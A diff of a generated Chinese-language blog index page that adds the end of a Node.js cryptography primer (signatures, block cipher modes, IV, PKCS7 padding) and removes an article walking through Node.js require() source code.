+<li>对比D1、D2，如果D1等于D2，说明原始信息完整、未被篡改。</li>
+</ol>
+<p>附：签名验证伪代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">digest1 = verify(digitalSignature, publicKey); <span class="comment">// 获取摘要</span></span><br><span class="line">digest2 = hash(message); <span class="comment">// 计算原始信息的摘要</span></span><br><span class="line">digest1 === digest2      <span class="comment">// 验证是否相等</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="3、对比非对称加密"><a href="#3、对比非对称加密" class="headerlink" title="3、对比非对称加密"></a>3、对比非对称加密</h3><p>由于RSA算法的特殊性，加密/解密、签名/验证 看上去特别像，很多同学都很容易混淆。先记住下面结论，后面有时间再详细介绍。</p>
+<ol>
+<li>加密/解密：公钥加密，私钥解密。</li>
+<li>签名/验证：私钥签名，公钥验证。</li>
+</ol>
+<h2 id="六、分组加密模式、填充、初始化向量"><a href="#六、分组加密模式、填充、初始化向量" class="headerlink" title="六、分组加密模式、填充、初始化向量"></a>六、分组加密模式、填充、初始化向量</h2><p>常见的对称加密算法，如AES、DES都采用了分组加密模式。这其中，有三个关键的概念需要掌握：模式、填充、初始化向量。</p>
+<p>搞清楚这三点，才会知道crypto模块对称加密API的参数代表什么含义，出了错知道如何去排查。</p>
+<h3 id="1、分组加密模式"><a href="#1、分组加密模式" class="headerlink" title="1、分组加密模式"></a>1、分组加密模式</h3><p>所谓的分组加密，就是将（较长的）明文拆分成固定长度的块，然后对拆分的块按照特定的模式进行加密。</p>
+<p>常见的分组加密模式有：ECB（不安全）、CBC（最常用）、CFB、OFB、CTR等。</p>
+<p>以最简单的ECB为例，先将消息拆分成等分的模块，然后利用秘钥进行加密。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-ECB_encryption.svg.png" alt=""><br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-ECB_decryption.svg.png" alt=""><br>更多关于分组加密模式的介绍可以参考 <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Common_modes" target="_blank" rel="noopener">wiki</a>。</p>
+<p>后面假设每个块的长度为128位</p>
+<h3 id="2、初始化向量：IV"><a href="#2、初始化向量：IV" class="headerlink" title="2、初始化向量：IV"></a>2、初始化向量：IV</h3><p>为了增强算法的安全性，部分分组加密模式（CFB、OFB、CTR）中引入了初始化向量（IV），使得加密的结果随机化。也就是说，对于同一段明文，IV不同，加密的结果不同。</p>
+<p>以CBC为例，每一个数据块，都与前一个加密块进行亦或运算后，再进行加密。对于第一个数据块，则是与IV进行亦或。</p>
+<p>IV的大小跟数据块的大小有关（128位），跟秘钥的长度无关。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-CBC_encryption.svg.png" alt=""><br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-CBC_decryption.svg.png" alt=""></p>
+<h3 id="3、填充：padding"><a href="#3、填充：padding" class="headerlink" title="3、填充：padding"></a>3、填充：padding</h3><p>分组加密模式需要对长度固定的块进行加密。分组拆分完后，最后一个数据块长度可能小于128位，此时需要进行填充以满足长度要求。</p>
+<p>填充方式有多重。常见的填充方式有<a href="https://tools.ietf.org/html/rfc5652#section-6.3" target="_blank" rel="noopener">PKCS7</a>。</p>
+<p>假设分组长度为k字节，最后一个分组长度为k-last，可以看到：</p>
+<ol>
+<li>不管明文长度是多少，加密之前都会会对明文进行填充 （不然解密函数无法区分最后一个分组是否被填充了，因为存在最后一个分组长度刚好等于k的情况）</li>
+<li>如果最后一个分组长度等于k-last === k，那么填充内容为一个完整的分组 k k k … k （k个字节）</li>
+<li>如果最后一个分组长度小于k-last &lt; k，那么填充内容为 k-last mod k </li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">         01 -- if lth mod k = k-1</span><br><span class="line">      02 02 -- if lth mod k = k-2</span><br><span class="line">          .</span><br><span class="line">          .</span><br><span class="line">          .</span><br><span class="line">k k ... k k -- if lth mod k = 0</span><br></pre></td></tr></table></figure>
+<h3 id="概括来说"><a href="#概括来说" class="headerlink" title="概括来说"></a>概括来说</h3><ol>
+<li>分组加密：先将明文切分成固定长度的块（128位），再进行加密。</li>
+<li>分组加密的几种模式：ECB（不安全）、CBC（最常用）、CFB、OFB、CTR。</li>
+<li>填充(padding)：部分加密模式，当最后一个块的长度小于128位时，需要通过特定的方式进行填充。（ECB、CBC需要填充，CFB、OFB、CTR不需要填充）</li>
+<li>初始化向量（IV）：部分加密模式（CFB、OFB、CTR）会将 明文块 与 前一个密文块进行亦或操作。对于第一个明文块，不存在前一个密文块，因此需要提供初始化向量IV（把IV当做第一个明文块 之前的 密文块）。此外，IV也可以让加密结果随机化。</li>
+</ol>
+<h2 id="七、相关链接"><a href="#七、相关链接" class="headerlink" title="七、相关链接"></a>七、相关链接</h2><p><a href="https://github.com/chyingp/nodejs-learning-guide" target="_blank" rel="noopener">Nodejs学习笔记</a></p>
+<p><a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function" target="_blank" rel="noopener">Cryptographic hash function</a></p>
+<p><a href="https://en.wikipedia.org/wiki/Hash-based_message_authentication_code" target="_blank" rel="noopener">Hash-based message authentication code</a></p>
+<p><a href="https://crypto.stackexchange.com/questions/2936/hmac-vs-mac-functions" target="_blank" rel="noopener">HMAC vs MAC functions</a></p>
+<p><a href="https://crypto.stackexchange.com/questions/6523/what-is-the-difference-between-mac-and-hmac" target="_blank" rel="noopener">What is the difference between MAC and HMAC?</a></p>
+<p><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="noopener">Block cipher mode of operation</a></p>
+<p><a href="https://www.zhihu.com/question/25912483/answer/31653639" target="_blank" rel="noopener">RSA的公钥和私钥到底哪个才是用来加密和哪个用来解密？ - 刘巍然-学酥的回答 - 知乎</a></p>
+<h4 id="原文：https-www-cnblogs-com-chyingp-p-nodejs-learning-crypto-theory-html"><a href="#原文：https-www-cnblogs-com-chyingp-p-nodejs-learning-crypto-theory-html" class="headerlink" title="原文：https://www.cnblogs.com/chyingp/p/nodejs-learning-crypto-theory.html"></a>原文：<a href="https://www.cnblogs.com/chyingp/p/nodejs-learning-crypto-theory.html" target="_blank" rel="noopener">https://www.cnblogs.com/chyingp/p/nodejs-learning-crypto-theory.html</a></h4>
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
         <time datetime="2017-02-12T06:45:23.000Z"><a href="/2017/02/12/网络安全/数字证书的基础知识/">2017-02-12</a></time>
       
       
@@ -538,297 +804,6 @@
 
 
 
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-09-07T06:45:23.000Z"><a href="/2016/09/07/Node.js_模块/require()源码解读/">2016-09-07</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2016/09/07/Node.js_模块/require()源码解读/">require() 源码解读</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <p>2009年，<a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a> 项目诞生，所有模块一律为 <a href="https://en.wikipedia.org/wiki/CommonJS" target="_blank" rel="noopener">CommonJS</a> 格式。</p>
-<p>时至今日，Node.js 的模块仓库 <a href="https://www.npmjs.com/" target="_blank" rel="noopener">npmjs.com</a> ，已经存放了几十万个模块，其中绝大部分都是 CommonJS 格式。</p>
-<p>这种格式的核心就是 require 语句，模块通过它加载。学习 Node.js ，必学如何使用 require 语句。本文通过源码分析，详细介绍 require 语句的内部运行机制，帮你理解 Node.js 的模块机制。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/require01_180712.png" alt=""></p>
-<h2 id="一、require-的基本用法"><a href="#一、require-的基本用法" class="headerlink" title="一、require() 的基本用法"></a>一、require() 的基本用法</h2><p>分析源码之前，先介绍 require 语句的内部逻辑。如果你只想了解 require 的用法，只看这一段就够了。</p>
-<p>下面的内容翻译自<a href="https://nodejs.org/api/modules.html#modules_all_together" target="_blank" rel="noopener">《Node使用手册》</a>。</p>
-<p>当 Node 遇到 require(X) 时，按下面的顺序处理。</p>
-<ol>
-<li><p>如果 X 是内置模块（比如 require(‘http’）)<br>　　- 1.1.  返回该模块。<br>　　- 1.2. 不再继续执行。</p>
-</li>
-<li><p>如果 X 以 “./“ 或者 “/“ 或者 “../“ 开头 </p>
-<ul>
-<li>2.1. 根据 X 所在的父模块，确定 X 的绝对路径。 </li>
-<li>2.2. 将 X 当成文件，依次查找下面文件，只要其中有一个存在，就返回该文件，不再继续执行。 <pre><code>- X                                
-- X.js
-- X.json
-- X.node
-</code></pre></li>
-<li>2.3. 将 X 当成目录，依次查找下面文件，只要其中有一个存在，就返回该文件，不再继续执行。<pre><code>- X/package.json（main字段）                                 
-- X/index.js
-- X/index.json
-- X/index.node
-</code></pre></li>
-</ul>
-</li>
-<li><p>如果 X 不带路径<br>　　- 3.1. 根据 X 所在的父模块，确定 X 可能的安装目录。<br>　　- 3.2. 依次在每个目录中，将 X 当成文件名或目录名加载。</p>
-</li>
-<li><p>抛出 “not found”</p>
-</li>
-</ol>
-<p>请看一个例子。</p>
-<p>当前脚本文件 <code>/home/ry/projects/foo.js</code> 执行了 require(‘bar’) ，这属于上面的第三种情况。Node 内部运行过程如下。</p>
-<p>首先，确定 x 的绝对路径可能是下面这些位置，依次搜索每一个目录。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/home/ry/projects/node_modules/bar</span><br><span class="line">/home/ry/node_modules/bar</span><br><span class="line">/home/node_modules/bar</span><br><span class="line">/node_modules/bar</span><br></pre></td></tr></table></figure>
-<p>搜索时，Node 先将 bar 当成文件名，依次尝试加载下面这些文件，只要有一个成功就返回。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bar</span><br><span class="line">bar.js</span><br><span class="line">bar.json</span><br><span class="line">bar.node</span><br></pre></td></tr></table></figure>
-<p>如果都不成功，说明 bar 可能是目录名，于是依次尝试加载下面这些文件。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bar/package.json（main字段）</span><br><span class="line">bar/index.js</span><br><span class="line">bar/index.json</span><br><span class="line">bar/index.node</span><br></pre></td></tr></table></figure>
-<p>如果在所有目录中，都无法找到 bar 对应的文件或目录，就抛出一个错误。</p>
-<h2 id="二、Module-构造函数"><a href="#二、Module-构造函数" class="headerlink" title="二、Module 构造函数"></a>二、Module 构造函数</h2><p>了解内部逻辑以后，下面就来看源码。</p>
-<p>require的源码在Node的<a href="https://github.com/joyent/node/blob/master/lib/module.js" target="_blank" rel="noopener">lib/module.js</a> 文件。为了便于理解，本文引用的源码是简化过的，并且删除了原作者的注释。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Module</span>(<span class="params">id, parent</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.id = id;</span><br><span class="line">  <span class="keyword">this</span>.exports = &#123;&#125;;</span><br><span class="line">  <span class="keyword">this</span>.parent = parent;</span><br><span class="line">  <span class="keyword">this</span>.filename = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">this</span>.loaded = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">this</span>.children = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = Module;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">module</span> = <span class="keyword">new</span> Module(filename, parent);</span><br></pre></td></tr></table></figure>
-<p>上面代码中，Node 定义了一个构造函数 Module，所有的模块都是 Module 的实例。可以看到，当前模块（module.js）也是 Module 的一个实例。</p>
-<p>每个实例都有自己的属性。下面通过一个例子，看看这些属性的值是什么。新建一个脚本文件 a.js 。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a.js</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'module.id: '</span>, <span class="built_in">module</span>.id);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'module.exports: '</span>, <span class="built_in">module</span>.exports);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'module.parent: '</span>, <span class="built_in">module</span>.parent);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'module.filename: '</span>, <span class="built_in">module</span>.filename);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'module.loaded: '</span>, <span class="built_in">module</span>.loaded);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'module.children: '</span>, <span class="built_in">module</span>.children);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'module.paths: '</span>, <span class="built_in">module</span>.paths);</span><br></pre></td></tr></table></figure>
-<p>运行这个脚本。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ node a.js</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.id:  .</span><br><span class="line"><span class="built_in">module</span>.exports:  &#123;&#125;</span><br><span class="line"><span class="built_in">module</span>.parent:  <span class="literal">null</span></span><br><span class="line"><span class="built_in">module</span>.filename:  <span class="regexp">/home/</span>ruanyf/tmp/a.js</span><br><span class="line"><span class="built_in">module</span>.loaded:  <span class="literal">false</span></span><br><span class="line"><span class="built_in">module</span>.children:  []</span><br><span class="line"><span class="built_in">module</span>.paths:  [ <span class="string">'/home/ruanyf/tmp/node_modules'</span>,</span><br><span class="line">  <span class="string">'/home/ruanyf/node_modules'</span>,</span><br><span class="line">  <span class="string">'/home/node_modules'</span>,</span><br><span class="line">  <span class="string">'/node_modules'</span> ]</span><br></pre></td></tr></table></figure>
-<p>可以看到，如果没有父模块，直接调用当前模块，parent 属性就是 null，id 属性就是一个点。filename 属性是模块的绝对路径，path 属性是一个数组，包含了模块可能的位置。另外，输出这些内容时，模块还没有全部加载，所以 loaded 属性为 false 。</p>
-<p>新建另一个脚本文件 b.js，让其调用 a.js 。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// b.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a.js'</span>);</span><br></pre></td></tr></table></figure>
-<p>运行 b.js 。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ node b.js</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.id:  <span class="regexp">/home/</span>ruanyf/tmp/a.js</span><br><span class="line"><span class="built_in">module</span>.exports:  &#123;&#125;</span><br><span class="line"><span class="built_in">module</span>.parent:  &#123; object &#125;</span><br><span class="line"><span class="built_in">module</span>.filename:  <span class="regexp">/home/</span>ruanyf/tmp/a.js</span><br><span class="line"><span class="built_in">module</span>.loaded:  <span class="literal">false</span></span><br><span class="line"><span class="built_in">module</span>.children:  []</span><br><span class="line"><span class="built_in">module</span>.paths:  [ <span class="string">'/home/ruanyf/tmp/node_modules'</span>,</span><br><span class="line">  <span class="string">'/home/ruanyf/node_modules'</span>,</span><br><span class="line">  <span class="string">'/home/node_modules'</span>,</span><br><span class="line">  <span class="string">'/node_modules'</span> ]</span><br></pre></td></tr></table></figure>
-<p>上面代码中，由于 a.js 被 b.js 调用，所以 parent 属性指向 b.js 模块，id 属性和 filename 属性一致，都是模块的绝对路径。</p>
-<h2 id="三、模块实例的-require-方法"><a href="#三、模块实例的-require-方法" class="headerlink" title="三、模块实例的 require 方法"></a>三、模块实例的 require 方法</h2><p>每个模块实例都有一个 require 方法。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Module.prototype.require = <span class="function"><span class="keyword">function</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Module._load(path, <span class="keyword">this</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>由此可知，require 并不是全局性命令，而是每个模块提供的一个内部方法，也就是说，只有在模块内部才能使用 require 命令（唯一的例外是 REPL 环境）。另外，require 其实内部调用 Module._load 方法。</p>
-<p>下面来看 Module._load 的源码。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Module._load = function(request, parent, isMain) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//  计算绝对路径</span></span><br><span class="line">  var filename = Module._resolveFilename(request, parent);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//  第一步：如果有缓存，取出缓存</span></span><br><span class="line">  var cachedModule = Module._cache[filename];</span><br><span class="line">  <span class="keyword">if</span> (cachedModule) &#123;</span><br><span class="line">    <span class="keyword">return</span> cachedModule.exports;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第二步：是否为内置模块</span></span><br><span class="line">  <span class="keyword">if</span> (NativeModule.exists(filename)) &#123;</span><br><span class="line">    <span class="keyword">return</span> NativeModule.require(filename);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第三步：生成模块实例，存入缓存</span></span><br><span class="line">  var <span class="keyword">module</span> = <span class="keyword">new</span> Module(filename, parent);</span><br><span class="line">  Module._cache[filename] = <span class="keyword">module</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第四步：加载模块</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">module</span>.load(filename);</span><br><span class="line">    hadException = <span class="literal">false</span>;</span><br><span class="line">  &#125; finally &#123;</span><br><span class="line">    <span class="keyword">if</span> (hadException) &#123;</span><br><span class="line">      <span class="keyword">delete</span> Module._cache[filename];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第五步：输出模块的exports属性</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">module</span>.exports;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>上面代码中，首先解析出模块的绝对路径（filename），以它作为模块的识别符。然后，如果模块已经在缓存中，就从缓存取出；如果不在缓存中，就加载模块。</p>
-<p>因此，Module._load 的关键步骤是两个。</p>
-<ul>
-<li>Module._resolveFilename() ：确定模块的绝对路径</li>
-<li>module.load()：加载模块</li>
-</ul>
-<h2 id="四、模块的绝对路径"><a href="#四、模块的绝对路径" class="headerlink" title="四、模块的绝对路径"></a>四、模块的绝对路径</h2><p>下面是 Module._resolveFilename 方法的源码。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Module._resolveFilename = <span class="function"><span class="keyword">function</span>(<span class="params">request, parent</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第一步：如果是内置模块，不含路径返回</span></span><br><span class="line">  <span class="keyword">if</span> (NativeModule.exists(request)) &#123;</span><br><span class="line">    <span class="keyword">return</span> request;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第二步：确定所有可能的路径</span></span><br><span class="line">  <span class="keyword">var</span> resolvedModule = Module._resolveLookupPaths(request, parent);</span><br><span class="line">  <span class="keyword">var</span> id = resolvedModule[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">var</span> paths = resolvedModule[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第三步：确定哪一个路径为真</span></span><br><span class="line">  <span class="keyword">var</span> filename = Module._findPath(request, paths);</span><br><span class="line">  <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">    <span class="keyword">var</span> err = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Cannot find module '"</span> + request + <span class="string">"'"</span>);</span><br><span class="line">    err.code = <span class="string">'MODULE_NOT_FOUND'</span>;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> filename;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>上面代码中，在 Module.<em>resolveFilename 方法内部，又调用了两个方法 Module.</em>resolveLookupPaths() 和 Module._findPath() ，前者用来列出可能的路径，后者用来确认哪一个路径为真。</p>
-<p>为了简洁起见，这里只给出 Module._resolveLookupPaths() 的运行结果。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[   <span class="string">'/home/ruanyf/tmp/node_modules'</span>,</span><br><span class="line">    <span class="string">'/home/ruanyf/node_modules'</span>,</span><br><span class="line">    <span class="string">'/home/node_modules'</span>,</span><br><span class="line">    <span class="string">'/node_modules'</span> </span><br><span class="line">    <span class="string">'/home/ruanyf/.node_modules'</span>,</span><br><span class="line">    <span class="string">'/home/ruanyf/.node_libraries'</span>，</span><br><span class="line">     <span class="string">'$Prefix/lib/node'</span> ]</span><br></pre></td></tr></table></figure>
-<p>上面的数组，就是模块所有可能的路径。基本上是，从当前路径开始一级级向上寻找 node_modules 子目录。最后那三个路径，主要是为了历史原因保持兼容，实际上已经很少用了。</p>
-<p>有了可能的路径以后，下面就是 Module._findPath() 的源码，用来确定到底哪一个是正确路径。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Module._findPath = <span class="function"><span class="keyword">function</span>(<span class="params">request, paths</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 列出所有可能的后缀名：.js，.json, .node</span></span><br><span class="line">  <span class="keyword">var</span> exts = <span class="built_in">Object</span>.keys(Module._extensions);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果是绝对路径，就不再搜索</span></span><br><span class="line">  <span class="keyword">if</span> (request.charAt(<span class="number">0</span>) === <span class="string">'/'</span>) &#123;</span><br><span class="line">    paths = [<span class="string">''</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 是否有后缀的目录斜杠</span></span><br><span class="line">  <span class="keyword">var</span> trailingSlash = (request.slice(<span class="number">-1</span>) === <span class="string">'/'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第一步：如果当前路径已在缓存中，就直接返回缓存</span></span><br><span class="line">  <span class="keyword">var</span> cacheKey = <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">request</span>: request, <span class="attr">paths</span>: paths&#125;);</span><br><span class="line">  <span class="keyword">if</span> (Module._pathCache[cacheKey]) &#123;</span><br><span class="line">    <span class="keyword">return</span> Module._pathCache[cacheKey];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第二步：依次遍历所有路径</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, PL = paths.length; i &lt; PL; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> basePath = path.resolve(paths[i], request);</span><br><span class="line">    <span class="keyword">var</span> filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!trailingSlash) &#123;</span><br><span class="line">      <span class="comment">// 第三步：是否存在该模块文件</span></span><br><span class="line">      filename = tryFile(basePath);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!filename &amp;&amp; !trailingSlash) &#123;</span><br><span class="line">        <span class="comment">// 第四步：该模块文件加上后缀名，是否存在</span></span><br><span class="line">        filename = tryExtensions(basePath, exts);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第五步：目录中是否存在 package.json </span></span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">      filename = tryPackage(basePath, exts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">      <span class="comment">// 第六步：是否存在目录名 + index + 后缀名 </span></span><br><span class="line">      filename = tryExtensions(path.resolve(basePath, <span class="string">'index'</span>), exts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第七步：将找到的文件路径存入返回缓存，然后返回</span></span><br><span class="line">    <span class="keyword">if</span> (filename) &#123;</span><br><span class="line">      Module._pathCache[cacheKey] = filename;</span><br><span class="line">      <span class="keyword">return</span> filename;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第八步：没有找到文件，返回false </span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>经过上面代码，就可以找到模块的绝对路径了。</p>
-<p>有时在项目代码中，需要调用模块的绝对路径，那么除了 module.filename ，Node 还提供一个 require.resolve 方法，供外部调用，用于从模块名取到绝对路径。</p>
